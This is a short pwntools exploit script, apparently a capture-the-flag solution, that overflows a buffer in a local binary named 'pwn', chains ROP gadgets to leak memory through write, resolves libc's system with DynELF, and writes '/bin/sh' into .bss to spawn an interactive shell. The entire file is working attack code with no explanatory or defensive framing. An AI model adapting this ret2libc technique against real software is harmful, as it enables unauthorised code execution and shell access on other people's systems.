from pwn import *
p = process("./pwn")
elf = ELF("./pwn")
offset = 88
bss_addr = elf.bss()
start_addr = elf.symbols['_start']
pop_rdi_ret_addr = 0x00000000004005e3
pop_rsi_pop_r15_addr = 0x00000000004005e1
def leak(address):
	log.info('leak address => {} '.format(hex(address)))
	payload = 'a' * offset
	payload += p64(pop_rdi_ret_addr)
	payload += p64(1)
	payload += p64(pop_rsi_pop_r15_addr)
	payload += p64(address)
	payload += p64(1)
	payload += p64(elf.plt['write'])
	payload += p64(start_addr)
	p.send(payload)
	p.recv(0x100)
	address = p.recv(8)
	p.recv()
	return address
d = DynELF(leak, elf = ELF('./pwn'))
system_addr = d.lookup("system","libc")  #0x7fdb65436480 0x7f76435e1480 0x7f80c607d480
#read_addr = d.lookup("read","libc")
read_addr = elf.plt['read']
log.success("system address => {}".format(hex(system_addr)))
log.success("read address => {}".format(hex(read_addr)))
payload = 'a' * offset
payload += p64(pop_rdi_ret_addr)
payload += p64(0)
payload += p64(pop_rsi_pop_r15_addr)
payload += p64(bss_addr)
payload += p64(1)
payload += p64(read_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(bss_addr)
payload += p64(system_addr)
p.send(payload)
p.recv(0x100)
payload = '/bin/sh\x00'
p.send(payload)

p.interactive()